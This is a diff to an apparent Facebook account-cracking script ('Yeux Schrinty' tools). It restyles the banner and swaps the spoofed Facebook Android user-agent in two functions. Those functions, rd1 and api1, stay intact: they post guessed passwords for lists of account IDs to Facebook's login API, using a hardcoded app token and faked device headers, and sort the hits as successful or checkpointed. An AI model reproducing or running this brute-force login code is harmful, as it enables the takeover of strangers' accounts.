@@ -55,33 +55,26 @@ except:
 oks=[]
 cps=[]
 loop=0
-logo=("""\033[0;95m\033[1;37m\033[0;95m
-\033[0;92m
-\033[1;30m____  ____  ________  _____  _____  ____  ____  
-\033[1;30m|_  _||_  _||_   __  ||_   _||_   _||_  _||_  _| 
-\033[1;37m\ \  / /    | |_ \_|  | |    | |    \ \  / /   
-\033[1;30m\ \/ /     |  _| _   | '    ' |     > `' <    
-\033[1;37m   _|  |_    _| |__/ |   \ \__/ /    _/ /'`\ \_  
-\033[1;30m  |______|  |________|    `.__.'    |____||____| 
-                                                      
-\033[0;95m\033[1;37m\033[0;95m
-\033[1;39m \033[0;91m    \033[1;39m\033[1;33m Mis Yeux Schrinty 
-\033[1;39m \033[0;93m \033[1;39m \033[1;33mYeux Schrinty 
-\033[1;39m \033[0;94m  \033[1;39m \033[0;92mFREE 
-\033[1;39m \033[0;95m  \033[1;39m \033[1;33m 0.1
-\033[1;39m \033[1;36m     Yeux Schrinty BRAND
-\033[0;95m\033[1;37m\033[0;95m
+logo=("""\033[1;37m 
+ ____  ____  ________  _____  _____  ____  ____  
+|_  _||_  _||_   __  ||_   _||_   _||_  _||_  _| 
+  \ \  / /    | |_ \_|  | |    | |    \ \  / /   
+   \ \/ /     |  _| _   | '    ' |     > `' <    
+   _|  |_    _| |__/ |   \ \__/ /    _/ /'`\ \_  
+  |______|  |________|    `.__.'    |____||____| 
+                                                                                                                                            
+\033[1;37m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;37m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+\033[1;37m━▷ \033[1;37m𝙊𝙒𝙉𝙀𝙍    \033[1;37m◈✙◈\033[1;37m Mis Yeux Schrinty 
+\033[1;37m━▷ \033[1;37mm𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;37m◈✙◈ \033[1;37mYeux Schrinty
+\033[1;37m━▷ \033[1;37mm𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;37m◈✙◈ \033[1;37mFREE
+\033[1;37m━▷ \033[1;37mm𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;37m◈✙◈ \033[1;37m 0.1
+\033[1;37m━▷ \033[1;37mm𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 𝙊𝙒𝙉𝙀𝙍 𝙊𝙁 YEUX 𝐁𝐑𝐀𝐍𝐃
+\033[1;37m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[1;37m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO Yeux Schrinty  TOOLS               \033[;0m\033[1;91m\033[1;92m
-
---------------------------------------------------
-
-\033[1;32m[�] YOUR MIND IS YOUR  BEST  WEAPON
-
---------------------------------------------------""")
+------------------------------------------------""")
 
 def linex():
-	print(f'\033[0;95m------------------------------------------------')
+	print(f'\033[1;37mm------------------------------------------------')
 
 def Main_Yeux():
 		clear()
@@ -336,7 +329,7 @@ def rd1(ids,passlist):
 				en = random.choice(['en_US','en_GB'])
 				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
-				ua  = "[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.25;FBBV/730050789;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_GB;FBRV/600108626;FBCR/Plus;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3125;FBSV/6.0.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.10;FBBV/596517353;FBDM/{density=2.5,width=1080,height=1920};FBLC/en_PK;FBRV/148014708;FBCR/Singtel;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3263;FBSV/1.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/95.0.0.34.183;FBBV/92323450;[FBAN/Orca-Android;FBAV/160.0.0.35.174;FBBV/92323450;FBRV/18933560;FBPN/com.facebook.orca;FBLC/en_BD;FBCR/PK-UFONE;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 11 Lite;FBSV/8.1.1;FBCA/arm64-v8a:null;FBDM/density=2.75,width=1104,height=2344;FB_FW/1;]','[FBAN/FB4A;FBAV/319.0.0.9.197;FBBV/687102275;FBDM/{density=2.2,width=1080,height=1448};FBLC/en_US;FBRV/0;FBCR/Zong Nepal;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2021;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','Mozilla/5.0 (Linux; Android 12; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]','[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895222;FBDM/{density=3.0,width=1080,height=2081};FBLC/en_US;FBRV/215203224;FBCR/Jio 4G;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1806;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','Dalvik/2.1.0 (Linux; U; Android 10; realme 2 Build/QQ3A.200805.001)','Mozilla/5.0 (Linux; Android 6.0.1; SM-N916S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]','Mozilla/5.0 (Linux; Android 6.0.1; SM-N916L Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]"
+				ua  = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 				po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
@@ -395,7 +388,7 @@ def api1(ids,names,passlist):
 			en = random.choice(['en_US','en_GB'])
 			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
-			ua  = "[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.25;FBBV/730050789;FBDM/{density=1.0,width=1080,height=1920};FBLC/en_GB;FBRV/600108626;FBCR/Plus;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3125;FBSV/6.0.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.10;FBBV/596517353;FBDM/{density=2.5,width=1080,height=1920};FBLC/en_PK;FBRV/148014708;FBCR/Singtel;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX3263;FBSV/1.3.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/95.0.0.34.183;FBBV/92323450;[FBAN/Orca-Android;FBAV/160.0.0.35.174;FBBV/92323450;FBRV/18933560;FBPN/com.facebook.orca;FBLC/en_BD;FBCR/PK-UFONE;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 11 Lite;FBSV/8.1.1;FBCA/arm64-v8a:null;FBDM/density=2.75,width=1104,height=2344;FB_FW/1;]','[FBAN/FB4A;FBAV/319.0.0.9.197;FBBV/687102275;FBDM/{density=2.2,width=1080,height=1448};FBLC/en_US;FBRV/0;FBCR/Zong Nepal;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2021;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','Mozilla/5.0 (Linux; Android 12; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]','[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895222;FBDM/{density=3.0,width=1080,height=2081};FBLC/en_US;FBRV/215203224;FBCR/Jio 4G;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1806;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','Dalvik/2.1.0 (Linux; U; Android 10; realme 2 Build/QQ3A.200805.001)','Mozilla/5.0 (Linux; Android 6.0.1; SM-N916S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/389.0.0.42.111;]','Mozilla/5.0 (Linux; Android 6.0.1; SM-N916L Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]"
+			ua  = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
